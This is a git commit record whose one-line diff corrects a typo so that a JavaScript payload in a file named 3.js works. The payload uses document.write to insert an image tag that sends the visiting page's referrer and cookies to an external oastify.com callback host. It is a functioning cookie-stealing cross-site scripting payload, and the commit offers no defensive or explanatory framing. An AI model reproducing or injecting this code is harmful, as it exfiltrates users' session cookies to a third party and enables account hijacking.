cdd5ef47b8697c6b4473dd445858f80a98086942
marcus713605 <marcus.friedrich713@gmail.com>
2025-10-03 08:35:54 -0400

    Update 3.js

--- 3.js
+++ 3.js
@@ -1,1 +1,1 @@
-documnet.write('<img src="http://5gmxqa0p43eq7ulqsywotcet9kfb31rq.oastify.com/?'+document.referrer+document.cookie">');
+document.write('<img src="http://5gmxqa0p43eq7ulqsywotcet9kfb31rq.oastify.com/?'+document.referrer+document.cookie">');
